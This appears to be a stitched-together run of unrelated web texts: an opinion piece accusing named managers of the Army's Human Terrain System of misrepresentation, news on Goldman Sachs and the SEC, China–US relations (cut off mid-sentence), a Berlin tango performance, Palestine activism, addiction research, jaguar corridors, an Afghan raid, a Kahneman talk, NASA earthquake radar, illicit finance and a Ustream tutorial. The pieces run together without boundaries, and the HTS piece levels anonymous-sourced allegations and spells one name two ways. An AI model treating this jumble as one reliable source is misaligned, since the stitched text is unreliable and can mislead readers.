Personalities that figure prominently in the life of HTS -- and likely the US Army 's AR 15 - 6 investigation / other investigations of HTS -- are Lieutenant General Michael Vane , head of the US Army Capabilities Integration Center ( ARCIC ) at Fort Monroe , Virginia .
ARCIC is an element of the US Army 's Training and Doctrine Command ( TRADOC ) and , according to observers , oversees the ongoing AR 15 - 6 .
TRADOC is currently commanded by General Martin Dempsey .
His desk is where the " buck stops " on all matters TRADOC .
Retired US Army Colonel Maxie McFarland is the Deputy Chief of Staff for Intelligence for TRADOC G - 2 which , like Vane 's shop , is located Fort Monroe , Virginia .
Retired US Army Colonel Steve Fondacaro , HTS program manager ; and Mitzy Coughlin ( McFate ) , HTS senior social scientist round out what appears to be the HTS chain of command : Dempsey - Vane - McFarland - Fondacaro --- Carlough ( McFate ) .
According to observers , the current HTS structure and mission was approved and " signed off " on as an intelligence capability .
As reported previously , HTS is funded as a Military Intelligence Program ( MIP ) .
Some in the TRADOC chain of command , according to sources , were unaware that HTS was an intelligence support operation .
This has caused a significant amount of turbulence within the program , they say , as HTS management tries to figure out how to re-package and justify the program 's existence as an intelligence support operation .
Observers say that McFarland , Fondacaro and Carlough ( McFate ) falsely advertised the HTS program as pure social science research to universities , at various social science conferences , and particularly in their recruiting and training processes .
This has grave implications for universities and their researchers as many were convinced that their work - product was being used for humanitarian purposes .
The US Army could pull the funding from MIP and place it under a research function in the defense budget .
But management 's credibility quotient has sunk to unrecoverable depths and any attempt at claiming an error in the US Army budget process using " it was not supposed to be in the MIP , it was a mistake rationale " would be as ridiculous as hiring a horseshoer on to a Human Terrain Team .
But wait !
They did !
According to a Wapedia entry on the Human Terrain System , " HTS hired an unemployed and former US Marine who had been retired from the USMC for 23 years .
The former US Marine had recently undergone shoulder replacement surgery and could no longer shoe horses " Critics of HTS such as the observers / sources for this series of articles on HTS , Dr. Max Forte , Dr. David Price , Dr. Hugh Gusterson , Dr. Alberto Gonzalez , Dr. Robert Albro , and the American Anthropological Association have made the point over and again that HTS is ethically challenged at the management level and does , in fact , operate as an intelligence support program .
For stating their views they have been pilloried by McFarland , Fondacaro and Coughlin ( McFate ) and their supporters in and out of the military ( sources report that the officer currently conducting the AR 15 - 6 is being " bad mouthed " by some in HTS management ) .
Even the venerable Ben Connable who authored All Our Eggs in One Broken Basket ( HTS ) in TRADOC 's Military Review was criticized for expressing the view that the effort was cannibalizing military funding and in - house capabilities .
The focus on preparing / shaping the Human / Cultural Terrain for warfighters originated with the Defense Science Boards 2006 Summer Study on Strategic Vectors .
HTS is - and always has been -- intelligence support program and the information it produces is used to prepare / shape the human terrain and to enhances the kill / pacify chain .
Now the spin from HTS personnel appears to be that HTS is not an intelligence program in the traditional sense .
They are correct : it is a " new " intelligence program based on old intelligence programs .
Some believe that it is little more than a polling and community policing effort .
Answering the question Do They Want to Hug Us or Kill Us ? is the responsibility of the active duty military .
It must not be left to a hodge - podge of civilian contractors lured by high salaries and led by some in HTS management desperate to build a Human Terrain Agency replete with splendid offices in Kansas City .
There is indeed a role for social scientists and it is inside the wire , not outside it .
Life and limb have been sacrificed in HTS management 's quest to prove a point and get rich in the process .
It 's astonishing that a miniscule social science program like HTS should have such a high casualty rate and generate so much controversy .
More repugnant is that the HTS chain of command is numb to it all .
It 's always worth remembering : * Paula Loyd - killed / died of wounds * Nicole Suveges -- killed * Michael V. Bhatia -- killed * Lt Brian Brennan --( both legs amputated ) * Wesley Cureton -- wounded , status unknown * Scott Wilson -- wounded , status unknown * D. Ayala -- guilty of manslaughter * A. Salam , Afghani National killed by Ayala * Issa Salomi-- Hostage , released March 2010 * Name Unknown - shot in chest * Name Unknown - wounded in vehicle rollover * Name Unknown - wounded in vehicle rollover __________

The embattled Wall Street bank Goldman Sachs is edging close to accepting lesser charges – possibly involving an admission of negligence – to settle a $ 1bn fraud prosecution laid by US regulators last month .
An admission of failings by the bank , albeit far short of those alleged by the securities and exchange commission ( SEC ) , would mark a substantial retreat from Goldman 's defiant response to the regulator 's civil fraud lawsuit , which it continues to argue is wrong " in fact and in law " .
The SEC alleges that the bank misled investors over the controversial sale in 2007 of a $ 1bn ( £ 675 m ) derivative investment called Abacus tied to a package of mortgage loans .
The prospect of Goldman admitting to shortcomings comes only a week after the billionaire investor Warren Buffett , whose Berkshire Hathaway group has a major stake in Goldman , dismissed the SEC 's charges as misguided .
But the episode has left the bank struggling to protect its reputation .
Tentative talks about a deal are to continue this week after a meeting on Tuesday between Goldman 's lawyer and the SEC that signalled the first chink in a previously cast - iron insistence by the bank that it would fight the allegations .
Some analysts have speculated that the total cost of a settlement could be as much as $ 1bn , making it one of the largest in US history .
The Wall Street Journal last week reported that some executives and powerful alumni of Goldman are discussing whether the bank 's chairman , Lloyd Blankfein , should resign to restore confidence in the company .
While Goldman is adamantly refusing to accept any charge of fraud over its Abacus mortgage deal , it is anxious for a swift resolution of the case and is willing to countenance a more modest accusation , possibly along the lines of negligence or poor administrative processes .
Goldman is concerned about an ongoing avalanche of bad publicity and a slide in its stock , which has fallen by 22 % since the SEC laid charges in mid-April .
But the SEC is in less of a hurry , wary that if it backs down , it could face public and political hostility for weakness against an institution with powerful connections .
The SEC claims that Goldman misled investors in Abacus by failing to come clean about the role of a hedge fund , Paulson & Co , that was going " short " to bet on Abacus slumping in value .
The security duly dived as US housing prices slumped , leaving Royal Bank of Scotland , which backstopped liabilities , with a bill of $ 840 m .
The US department of justice is examining possible criminal charges against Goldman and , in Britain , the Financial Services Authority is looking into the deal .
Any admission of failures in a potential civil settlement will have to be carefully worded if it is not to influence a criminal investigation .
Adding to Goldman 's woes , the bank has faced a flurry of lawsuits from shareholders who claim they should have been told earlier of an SEC probe .
Yet in spite of the controversy , investors gave overwhelming backing to Blankfein at Friday 's annual meeting by re-electing him with 95 % of the vote .
A resolution calling for a slimming down of his role through a split between the jobs of chairman and chief executive captured a modest 19 % , below the support gained by similar motions at other top US companies .
Last week Buffett told an annual meeting of Berkshire Hathaway shareholders : " I do n't hold it against Goldman at all , the fact that allegations have been made by the US Securities and Exchange Commission . "
He said he was " 100 % " behind Blankfein and " loved " his $ 5 bn holding in Goldman .
A flourishing downtown Shanghai in January 2010
At the World Economic Forum in Davos this January , Chinese vice premier , Li Keqiang , gave an entirely unremarkable speech .
Steering clear of subjects that make headlines , he instead sung the praises of China ’s stability and technological progress .
Yet the moment was made extraordinary by Li’s entourage : a group of about 75 subordinates who laughed , cheered and applauded on cue — and all with apparently genuine gusto .
This scene brought to my mind Deng Xiaoping ’s famous dictum that his country must “ keep a low profile and never take the lead . ”
There was plenty of Chinese exuberance in the room , and the rest of us were meant to notice .
Has the need to lie low subsided , I wondered ?
Does China believe that its time has come ?
That was the message many people took from the triumphalist pageantry of Beijing ’s 2008 Olympics .
But the real game - changer was economic .
The financial crisis , global recession , and China ’s remarkable recovery have produced a big shift in the world ’s most important state - to - state relationship .
Chinese officials argue that their country ’s resilience in the face of America ’s meltdown has vindicated a Chinese model of development , one that rejects US - style free markets in favour of a “ state capitalist ” system .
A relationship until recently shaped mainly by shared interests must now adapt to accommodate the two sides ’ increasingly divergent views of capitalism — and a large shift in the balance of confidence .
The list of irritants in US - Chinese relations is growing .
Google threatens to quit China over censorship and cyber-attacks .
Washington and Beijing are at cross purposes over Iran ’s nuclear programme .
US lawmakers have again criticised China ’s unwillingness to allow the value of its currency to rise and its failure to protect the intellectual property of foreign companies .
There are trade disputes over tyres and steel pipes .
Yet these problems are merely symptoms of an illness that has progressed further than some observers realise .
Put bluntly , the Chinese leadership no longer believes that American power is as indispensable as it once was for either China ’s economic expansion or the Communist party ’s political survival .
Nor does it accept that access to US capital or commercial know - how is quite so important for the next stage of China ’s development — or that its growth depends on the spending habits of American consumers .
China has embarked on a process of economic “ decoupling . ”
The western financial meltdown put millions of Chinese out of work in …

Tango Panopticon Berlin 11-11-11
Part of Exchange Radical Moments ,
a Live Art Festival in 11 cites in Europe
Live 11-11 -11 at Hauptbahnhof , Berlin
It was cold enough at Berlins Hauptbahnhof to turn our breath to steam , and the station security force was already jittery due to a recent bomb scare , but our group of 6 intrepid tangueros managed to transform the annonymous crowds with a sequential series of brief musical embraces divided by annonymous transits .
The elevators were particularly fine locations for dancing in close embrace .
The views were enjoyed by those in the station , by hundreds people watching live video at http://11moments.org/tango and certainly by those watching the station security camera feeds .
Special thanks to Thomas Rieser of Nou Tango Berlin for helping us gather a great group of dancers !
I will post HD video documentation soon , but for now please look at http://11moments.org/tango

Live 11 -11-11 at Hauptbahnhof , Berlin , 7 - 8 pm ( CET )
Let ’s do a tango with the powers that be .
Dispersed within the train station ’s anonymous crowds - in - transit , six covert tangueros walk along invisible intersecting paths through the mass of urban strangers .
Whenever members of this secret tango cabal encounter each other music begins to emanate from one of their bodies , they embrace and share one intimate dance .
When the song ends the sensuality fades .
They part , melting back into the crowd of anonymous city procedure , but casually strolling toward their next intimate encounter .
To see to it that security personnel do n’t cut in as directors of choreography – and to ironically acknowledge the ubiquitous video surveillance in public space – the dancers will broadcast their transgressive steps live at www.11moments.org/location/berlin
Special thanks to Thomas Rieser of Nou Tango Berlin for helping us gather a great group of dancers !

Axis of Logic
They finally released our 10 friends yesterday from Israeli jails on bail pending “ trial ” .
Those kidnapped from the peaceful march in Bethlehem area on Palm Sunday attended a press conference in Ramallah and passed by Beit Sahour late last night .
Each is to appear in front of a military judge later this month .
Yet , the Friday regular demonstration in Al - Ma’sara was large and daring .
Speeches were given at the site where soldiers had stretched barbed wire blocking the road .
Internationals ( including Israelis ) participated with Palestinians .
The occupation troops decided to end the demonstration early with a barrage of concussion / stun grenades .
Two reporters and two demonstrators were injured by the soldiers as they tried to arrest some people in a violent way .
They managed to arrest our deaf Italian colleague .
The soldiers also shot directly at my car smashing one concussion grenade into the windshield from a distance of over 100 meters ( replacement and clean - up will cost $ 250-300 ) .
Similar repression occurred in other towns in the West Bank .
Israel also shelled a number of places in Gaza including a dairy products factory .

BART Art Commemorates
Palestine Land Day in San Francisco
A guerrilla art squad hung Land Day posters in place of advertisements on BART in advance of this morning 's commute .
Guerrilla artists took to BART this morning in observation of Palestinian Land Day .
Over 150 unauthorized posters appeared in many trains this morning , replacing the usual advertisements .
The stark black and white poster shows a woman clinging to an olive tree , while a soldier lurks behind her in a jeep .

There is a growing water crisis in Palestine that affects agriculture , industry , and the health of virtually every adult and child .
In the Gaza Strip , poor sanitation and over - extraction have polluted the limited water supply .
In September 2009 , the Middle East Children ’s Alliance ( MECA ) launched the Maia Project ( Arabic for “ water ” ) to provide Palestinian children with clean , safe drinking water .

Why is it that only some drug users become addicts ?
This is the question that has been addressed by the teams of Pier Vincenzo Piazza and Olivier Manzoni , at the Neurocentre Magendie in Bordeaux ( Inserm unit 862 ) .
These researchers have just discovered that the transition to addiction could result from a persistent impairment of synaptic plasticity in a key structure of the brain .
This is the first demonstration that a correlation exists between synaptic plasticity and the transition to addiction .
The results from the teams at Neurocentre Magendie call into question the hitherto held idea that addiction results from pathological cerebral modifications which develop gradually with drug usage .
Their results show that addiction may , instead , come from a form of anaplasticity , i.e. from incapacity of addicted individuals to counteract the pathological modifications caused by the drug to all users .
This research is published in the journal Science on 25 June 2010 .
The voluntary consumption of drugs is a behaviour found in many species of animal .
However , it had long been considered that addiction , defined as compulsive and pathological drug consumption , is a behaviour specific to the human species and its social structure .
In 2004 , the team of Pier Vincenzo Piazza showed that the behaviours which define addiction in humans , also appear in some rats which will self administer cocaine * .
Addiction exhibits astonishing similarities in men and rodents , in particular the fact that only a small number of consumers ( humans or rodents ) develop a drug addiction .
The study of drug dependent behaviour in this mammal model thus opened the way to the study of the biology of addiction .
Now , the teams of Pier Vincenzo Piazza and Olivier Manzoni are reporting discovery of the first known biological mechanisms for the transition from regular but controlled drug taking to a genuine addiction to cocaine , characterised by a loss of control over drug consumption .
Chronic exposure to drugs causes many modifications to the physiology of the brain .
Which of these modifications is responsible for the development of an addiction ?
This is the question the researchers wanted to answer in order to target possible therapeutic approaches to a disorder for which treatments are cruelly lacking .
The addiction model developed in Bordeaux provides a unique tool to answer this question .
Thus it allows comparing animals who took identical quantities of drugs , but of which only few become addicted .
By comparing addict and non-addict animals at various time points during their history of drug taking , the teams of Pier Vincenzo Piazza and Olivier Manzoni have demonstrated that the animals which developed an addiction to cocaine exhibit a permanent loss of the capacity to produce a form of plasticity known as long term depression ( or LTD ) .
LTD refers to the ability of the synapses ( the region of communication between neurons ) to reduce their activity under the effect of certain stimulations .
It plays a major role in the ability to develop new memory traces and , consequently , to demonstrate flexible behaviour .
After short term usage of cocaine , LTD is not modified .
However , after a longer use , a significant LTD deficit appears in all users .
Without this form of plasticity , which allows new learning to occur , behaviour with regard to the drug becomes more and more rigid , opening the door to development of a compulsive consumption .
The brain of the majority of users is able to produce the biological adaptations which allow to counteract the effects of the drug and to recover a normal LTD .
By contrast , the anaplasticity ( or lack of plasticity ) exhibited by the addicts leaves them without defences and hence the LTD deficit provoked by the drug becomes chronic .
This permanent absence of synaptic plasticity would explain why drug seeking behaviour becomes resistant to environmental constraints ( difficulty in procuring the substance , adverse consequences of taking the drug on health , social life , etc. ) and consequently more and more compulsive .
Gradually , control of the taking of the drug is lost and addiction appears .
For Pier - Vincenzo Piazza and his collaborators , these discoveries also have important implications for developing new treatment of addiction .
" We are probably not going to find new therapies by trying to understand the modifications caused by a drug in the brains of drug addicts , " explain the researchers , " since their brain is anaplastic . "
For the authors , " The results of this work show that it is in the brain of the non-addicted users that we will probably find the key to a true addiction therapy .
Indeed , " the authors estimate , " understanding the biological mechanisms which enable adaptation to the drug and which help the user to maintain a controlled consumption could provide us with the tools to combat the anaplastic state that leads to addiction . "
While Dr. Christensen called Costa Rica “ the poster child ” for its efforts , he said corridors for large mammals were also being created in places like Uganda and China .
The World Bank is financing corridor projects in Brazil and Peru ; more important , the bank ’s transportation planners are working with conservationists to ensure that building highways and laying train tracks so humans can move freely does not destroy that movement for animals , Dr. Christensen said .
Part of the reason that conservationists had in the past focused exclusively on preserves was that there was a lack of good data on the travel and breeding patterns of large animals like jaguars ; these big predators favor dense jungles and are nocturnal and extraordinarily shy .
So when new techniques allowed scientists to take a first look at the jaguar genome a decade ago , they were shocked to discover that jaguars from the northern reaches of Mexico had exactly the same genetic makeup as those from the southern tip of South America .
That meant that over time , some jaguars were moving up and down the Americas to breed ; otherwise , the isolation of jaguar populations in different regions would have caused their genetic makeups to diverge .
At least some males from Colombia were traveling to Panama to mate , and others were moving from Mexico to Belize .
“ It was surprising , but it seemed to say they had one continuous habitat , ” said Dr. Rabinowitz , the zoologist .
Scientists were convinced that jaguars would never cross a water barrier as wide as the Panama Canal , smack in the middle of their extended habitat .
But when they set up cameras to spot jaguars near the canal , they discovered that , every so often , a brave animal took the plunge , ensuring the continuity of genes in the north and south .
A SENIOR Taliban commander disguised in women 's clothes was killed by Afghan and international forces when he fired on troops trying to catch him south of Kabul .
NATO and Afghan security forces cornered Ghulam Sakhi at a compound in Logar province 's Puli Alam district , and called for women and children to leave the building , a coalition statement said .
" As they were exiting , Sakhi came out with the group disguised in women 's attire and pulled out a pistol and a grenade and shot at the security force , " the statement by NATO 's International Security Assistance Force ( ISAF ) said .
" When Afghan and coalition forces shot him , he dropped the grenade and it detonated , wounding a woman and two children , " it said .
Sakhi was known by several aliases and was involved in attacks on Afghan and foreign forces using improvised explosive devices ( IEDs ) , the main Taliban weapon in the war .
He had also been involved in the kidnap and killing of a security chief in Logar province , ISAF said .
Afghan and international forces also killed several insurgents in an air strike in the southern province of Zabul , ISAF said .
After the air strike , aimed at groups waging roadside bomb attacks , troops found materials used for making IEDs as well as automatic weapons and rocket - propelled grenade launchers at the scene , it said .
The statement added that the military took steps to protect civilians before calling in the air strike .
Civilian casualties are an incendiary issue in Afghanistan , even though the United Nations reported early this year that the vast majority of civilian deaths are caused by Taliban attacks .
The former commander of NATO forces in Afghanistan , US General Stanley McChrystal , limited air strikes as he made minimizing civilian casualties a major tenet of his counter - insurgency strategy .
McChrystal was sacked this week for insubordination and replaced by General David Petraeus , the chief architect of the counter - insurgency strategy .

Nobel laureate and founder of behavioral economics Daniel Kahneman performed a TED Talk this year about how as humans our “ experiencing selves ” and our “ remembering selves ” perceive happiness differently .
Basically , he says that our memories of experiences differ from what really happened during the experience itself .
But what ended up being the catchy soundbite was in the Q&A session after his talk , where he tells us that while millions of dollars wo n’t buy you happiness , a job that pays $ 60,000 a year might help .
This is based on a survey of 600,000 Americans :
“ Below 60,000 dollars a year , people are unhappy , and they get progressively unhappier the poorer they get .
Above that , we get an absolutely flat line .
I mean I ’ve rarely seen lines so flat . ”
“ Clearly … money does not buy you experiential happiness , but lack of money certainly buys you misery , ” he said .
But the real trick , Kahneman said , is to spend time with people you like .
I found this talk through the GatesVP blog , who offers this analysis :
In most parts of the US you already have access to a very good and healthy life at 60 k .
You ’ve pretty much covered everything commonly deemed as a necessity and you probably have some money left over for “ entertainment ” .
So the jump to 90 k really just gives you a little more “ entertainment ” and maybe some bigger stuff , but that ’s it .
And if you ’re the type who ’s not happy with being in the top 20 % , then how much further do you need to go ?
Top 10 % ?
Top 5 % ?
Really , 60 k for one job is far enough “ ahead of the game ” to keep happy those that can be kept happy .
And that ’s probably why this is true .
According to the 2008 US Census , making 60 k a year is in the top 20 % .
I pretty much agree , especially with the idea that humans are creatures of comparison .
As long as we ’re doing a little bit better than our neighbors , then we tend to be happy .
What do you think ?
You can view the entire TED Talk below .
The Q&A session starts at about 17:15 , and a transcript is available on the right sidebar here .
NASA Radar Images Show How Mexico Quake Deformed Earth
PASADENA , Calif. -- NASA has released the first - ever airborne radar images of the deformation in Earth 's surface caused by a major earthquake -- the magnitude 7.2 temblor that rocked Mexico 's state of Baja California and parts of the American Southwest on April 4 .
The data reveal that in the area studied , the quake moved the Calexico , Calif. , region in a downward and southerly direction up to 80 centimeters ( 31 inches ) .
The maps can be seen at : http://www.nasa.gov/topics/earth/features/UAVSARimage20100623.html .
A science team at NASA 's Jet Propulsion Laboratory , Pasadena , Calif. , used the JPL - developed Uninhabited Aerial Vehicle Synthetic Aperture Radar ( UAVSAR ) to measure surface deformation from the quake .
The radar flies at an altitude of 12.5 kilometers ( 41,000 feet ) on a Gulfstream - III aircraft from NASA 's Dryden Flight Research Center , Edwards , Calif .
The team used a technique that detects minute changes in the distance between the aircraft and the ground over repeated , GPS - guided flights .
The team combined data from flights on Oct. 21 , 2009 , and April 13 , 2010 .
The resulting maps are called interferograms .
The April 4 , 2010 , El Mayor - Cucapah quake was centered 52 kilometers ( 32 miles ) south - southeast of Calexico , Calif. , in northern Baja California .
It occurred along a geologically complex segment of the boundary between the North American and Pacific tectonic plates .
The quake , the region 's largest in nearly 120 years , was also felt in southern California and parts of Nevada and Arizona .
It killed two , injured hundreds and caused substantial damage .
There have been thousands of aftershocks , extending from near the northern tip of the Gulf of California to a few miles northwest of the U.S. border .
The area northwest of the main rupture , along the trend of California 's Elsinore fault , has been especially active , and was the site of a large , magnitude 5.7 aftershock on June 14 .
UAVSAR has mapped California 's San Andreas and other faults along the plate boundary from north of San Francisco to the Mexican border every six months since spring 2009 , looking for ground motion and increased strain along faults .
" The goal of the ongoing study is to understand the relative hazard of the San Andreas and faults to its west like the Elsinore and San Jacinto faults , and capture ground displacements from larger quakes , " said JPL geophysicist Andrea Donnellan , principal investigator of the UAVSAR project to map and assess seismic hazard in Southern California .
Each UAVSAR flight serves as a baseline for subsequent quake activity .
The team estimates displacement for each region , with the goal of determining how strain is partitioned between faults .
When quakes do occur during the project , the team will observe their associated ground motions and assess how they may redistribute strain to other nearby faults , potentially priming them to break .
Data from the Baja quake are being integrated into JPL's QuakeSim advanced computer models to better understand the fault systems that ruptured and potential impacts to nearby faults , such as the San Andreas , Elsinore and San Jacinto faults .
One figure ( Figure 1 ) shows a UAVSAR interferogram swath measuring 110 by 20 kilometers ( 69 by 12.5 miles ) overlaid atop a Google Earth image .
Each colored contour , or fringe , of the interferogram represents 11.9 centimeters ( 4.7 inches ) of surface displacement .
Major fault lines are marked in red , and recent aftershocks are denoted by yellow , orange and red dots .
The quake 's maximum ground displacements of up to 3 meters ( 10 feet ) actually occurred well south of where the UAVSAR measurements stop at the Mexican border .
However , these displacements were measured by JPL geophysicist Eric Fielding using synthetic aperture radar interferometry from European and Japanese satellites and other satellite imagery , and by mapping teams on the ground .
Scientists are still working to determine the exact northwest extent of the main fault rupture , but it is clear it came within 10 kilometers ( 6 miles ) of the UAVSAR swath , close to the point where the interferogram fringes converge .
" Continued measurements of the region should tell us whether the main fault rupture has moved north over time , " Donnellan said .
An enlargement of the interferogram is shown in another figure ( Figure 2 ) , focusing on the area where the largest deformation was measured .
The enlargement , which covers an area measuring about 20 by 20 kilometers ( 12.5 by 12.5 miles ) , reveals many small " cuts , " or discontinuities , in the fringes .
These are caused by ground motions ranging from a centimeter to tens of centimeters ( a few inches ) on small faults .
" Geologists are finding the exquisite details of the many small fault ruptures extremely interesting and valuable for understanding the faults that ruptured in the April 4th quake , " said Fielding .
Another figure , ( Figure 3 ) shows a close - up of the region where the magnitude 5.7 aftershock struck .
" UAVSAR 's unprecedented resolution is allowing scientists to see fine details of the Baja earthquake 's fault system activated by the main quake and its aftershocks , " said UAVSAR Principal Investigator Scott Hensley of JPL .
" Such details are n't visible with other sensors . "
UAVSAR is part of NASA 's ongoing effort to apply space - based technologies , ground - based techniques and complex computer models to advance our understanding of quakes and quake processes .
The radar flew over Hispaniola earlier this year to study geologic processes following January 's devastating Haiti quake .
The data are giving scientists a baseline set of imagery in the event of future quakes .
These images can then be combined with post - quake imagery to measure ground deformation , determine how slip on faults is distributed , and learn more about fault zone properties .
UAVSAR is also serving as a flying test bed to evaluate the tools and technologies for future space - based radars , such as those planned for a NASA mission currently in formulation called the Deformation , Ecosystem Structure and Dynamics of Ice , or DESDynI .
That mission will study hazards such as earthquakes , volcanoes and landslides , as well as global environmental change .

2010 - 208
DURING THE G8 /G20 summits that begin today in Canada , the global economy and international development will be topics of earnest discussion .
Lurking at the margins of this polite conversation will be the skunk at the garden party : corruption .
Everyone ’s against corruption , or so they say .
But virtually every country in the world is awash in cross - border flows of corrupt , criminal , and tax - evading money .
To Western eyes , the Third World is the locus of this shady behavior .
Yet the rich and powerful countries , the winners that write the rules for the global financial system , are corruption ’s pinstriped enablers .
With bribery , the most recognizable of corruption ’s many faces , we often forget that both parties are equally guilty , and equally capable of initiating it .
Still , it ’s the corrupt dictator who offshores his millions while his people are starving that most infuriates us .
But where ’s the outrage at the reception those ill - gotten gains routinely enjoy at Western banks ?
The Treasury Department says that virtually 100 percent of criminal and corrupt money presented to American banks is accepted into secure accounts , prompting Time magazine to dub the United States as possibly “ the world ’s biggest washing machine for dirty money . ’’
But what ’s really troubling is that bribery makes up a mere 3 percent of the world ’s estimated $ 2 trillion in annual illicit money flows , according to Global Financial Integrity , a Washington research group .
Organized crime and trafficking account for another 30 to 35 percent .
A whopping 60 to 65 percent of the world ’s dirty money stems from the intentional , illegal manipulation of taxes and of commerce ( e.g. , falsified pricing , sham transactions ) , particularly by multinational corporations .
Some 60 percent of world trade ( about $ 35 trillion , pre-recession ) consists of “ intratrade ’ ’ by multinationals .
Intratrade is business conducted among parent companies , affiliates , and subsidiaries , frequently dummy sites in tax havens ( In 2008 , Boeing had 38 such subsidiaries ; Morgan Stanley had 273 ) .
In a legal process called transfer pricing , multinationals set their own artificial ( non-market ) price for “ transactions ’ ’ that are moved on paper through multiple subsidiaries in several jurisdictions , until maximum tax benefits accrue .
Transfer pricing ’s guidelines can be murky , but its inherent conflict - of - interest is what creates one of business ’s worst - kept secrets : most multinationals ( and most of the top 100 are American ) deliberately engage in illegal tax evasion in at least some of their transactions .
Hundreds of billions of dollars in annual tax revenues are lost this way , most critically to countries in dire need of money for development .
In effect , the global financial system ’s secrecy jurisdictions and tax havens have become an equal - opportunity repository for all illicit money , similarly available to and exploited by the murderous “ godfather , ’’ the corrupt official , or the tax - evading executive .
Crime should not be facilitated by an opaque global financial system that accepts and then conceals dirty money .
Multinational companies , which do much good around the world , should not risk their reputations by conducting business through the same mechanisms that shelter blood - stained funds .
Relatively simple expedients — automatic exchange of tax information between countries , or country - by country accounting of sales , profits , and taxes paid by multinationals , for example — would greatly increase transparency and accountability around the globe .
According to GFI , developing countries lose $ 1 trillion annually due to crime , government corruption , and tax evasion .
That outflow of funds is roughly 10 times greater than the amount of aid for development and poverty alleviation that poor countries receive from wealthy ones .
Yes , it ’s ultimately up to the people of the developing countries to throw their own bums out , build their own institutions , and stand on their own two feet .
No one wants all that more than they do .
We in the West have a voice they do n’t ; we can demand that the architects of the global financial structure redesign it so sunlight will stream into now - dark corners .
Getting our own house in order would help make the world a brighter and better place .

A new video quality tutorial has been written by forum member Yourwhiteshadow and it has youtube tutorials too !
See the guide here !******************************************************************************************************* Your graphic settings and picture example so others have a starting point .
Any suggestions for IRC moderating and tools to useAnything else you can think of !
Credit always given to contributors !*******************************************************************************************************
And now back to your regularly scheduled ... I 'm probably the least knowledgeable person about the subject , but I will get ustream functional by the end of this tutorial .
If you have any tricks for higher quality , share please !
Of course , livestream 's procaster does all this for you , but if you have a beef against livestream 's ads or recent freeze / crash issues then Ustream is the next best thing .
Please if you have any suggestions / additions do tell !is a free screen capture device that is low quality , but does n't have a watermark .
free / watermarkVH
Screen Capture is the highest quality capture device with the least amount of headache for free .
Free because adobe wants to rule the internetFlash Media Live Encoder is the program that Ustream has chosen to integrate into .
We have to use this to get around the fact that the Ustream producer does n't allow anything but the microphone for audio in ( AFAIK )
It also allows easy manipulation of video quality .
WebcamMax $ 50 is not a free program , but it does capture your screen without a watermark .
It seems to be very CPU intensive though , so try this out if you want a more professional quality and have the computing power to handle it ( Core i7 and above ) free / open sourceCamstudio is another freebie of unknown quality .
InFanView is a free image viewing / editing program for non-commercial useThis is what you 'll use if you need an image always - on - top of your starcraft window .
Useful for hiding the replay timer or if you just want to create a brand or advertise for your sponsor .
Any sound card that allows stereo mixing .
This includes all Soundblaster Live ! , Audigy , and Realtek HD sound devices .
Mine is integrated into my motherboard and works fine .
Soundblaster name =
What U hear .
Realtek name = Stereo Mix
This section will be two - fold .
First you need to make sure your mic playback is n't muted and second you need to make sure your stereo mix /
What u hear is turned on .
( Do n't make it default , just turn it on ) .
I 'll only be able to explain this for Realtek HD sound cards , these are almost always the card you will have integrated on your motherboard in a desktop , laptops get funky .
Step 1 : make sure your mic is set to playback .
Find your Realtek HD Audio Manager .
This can be done by either right clicking the red speaker icon in your system tray or by going to your computer 's Control Panel and selecting it .
Step 2 : Make sure your stereo mix is not hidden and turned on .
a)
To get to this location , click Sound Devices , Sound , or Change System Sounds in your control panel .
Alternatively , choose Audio Devices from the right click menu of the Realtek red speaker icon in the system tray .b)
Any way you get to it , switch to the .
If you see Stereo Mix , Great ! right click and enable it .
If you do not see it , right click anywhere on this screen and choose " Show Disabled Devices " .
Now enable it .
If you still do n't see Stereo Mix then your sound card does n't support this feature .
Either google a different solution or download the latest realtek drivers .
Step 1 : Once you install VHSC go into your start menu or on the desktop and choose " Configure VHScrCap "
It will probably yell at you that there is no device found , Choose the option for setting up a new driver .
You should see one of these 3 screens with the option to switch between them :
If you can't switch between them try using the x86 version , this is what happened to me too .
Step 2 : Make sure the Capture tab is set toStep 3 : Set the Settings tab to 60FPS , we will be adjusting FPS and quality on FMLE instead , so we want the highest quality going from this program to the other .
Step 1 : make sure both VHSC and FMLE are running .
Step 2 : Assuming you already have a ustream account , go to the Advanced tab on your show 's settings .
Scroll down to this area : and download that XML file to your local machine ( do n't select open ) .
Step 3 : install the two programs you downloaded , FMLE and VHScreenCapture .
Start both programsStep 4 : Inside of FMLE , go to the file menu and choose " Open Profile " .
Select your XML and open it .
This should fill out the information on the right side of the program for " Stream to Flash Media server " with the ustream info and your secret code .
Do n't share your secret code ( the one in the stream box ) as this will allow others to broadcast on your Ustream account .
Step 5 : Set your settings like thisor something similar .
You can mess around with H.264 format , frame rates , bit rate , and output size to your hearts content to get the best quality .
Step 1 : once VHSC is providing the video , Stereo Mix is providing the audio , and you 're output is set to ustream 's XML data hit the START button at the bottom .
It will look like this giving you output values : Step 2 : Go into ustream to the YOUR SHOWS page and select BROADCAST NOWStep 3 : When the broadcast window pops up , it should look like this :
The video and audio sources are blank , because it is pulling the stream directly from FMLE 's feed .
the broadcaster is not doing any work except turning it off and on .----------------------------------------------------------------------------------------------------------------------------------There are no requirements to add your stream to the non-featured streams list on the site , here is how you should prepare .
EDIT : Chill posted new rules .
Visit that thread for adding your stream .----------------------------------------------------------------------------------------------------------------------------------We will be using a program called InFanView for this .
Once downloaded , open the program and open your favorite image file .
Follow these simple steps to get rid of any distractions , make the window resizeable , and always on top.1 )
Options menu , select " Always on top " ( last option ) simple enough .
2 ) View menu , Display Options , Choose " Fit image to window " and make sure the bottom 3 are checked for quality ( they are by default ) 3 )
View menu , Show / Hide the first 4 options for Status bar , Toolbar , Menu bar , and Caption .
Alternatively , hold Alt + Shift + S, T , M, C respectively .
Done !
Now you have an image that will stay on top of your starcraft display ( assuming you 're in Windowed or Windowed ( Fullscreen ) modes ) and not look ugly .
Have fun----------------------------------------------------------------------------------------------------------------------------------- by TotalBiscuit of SC2 Shoutcraft fame► I was looking at some information on another forum about this and it stated that a possible fix for the 2 - 3 fps thing was to change from FME 3.0 to FME 2.5 .
I have not managed to test that yet , so it may be a complete red herring , but it 's worth a shot .
I should also point out that ' internet connection ' has nothing to do with that problem at all .
Check the encoding logs , you will quite clearly see frequent , absurd drops to really low bitrates , such as 30 kbp /s as well as low framerates which cause that juddery issue as well as the artifacting .
FME 2.5 MAY alleviate that problem , maybe .
it 's worth a try . ►
Another thing , VHScrCap can cause a lot of flickering in SC2 UNLESS you play it in Fullscreen Windowed mode .
If that occurs for you , that 's the solution . ►
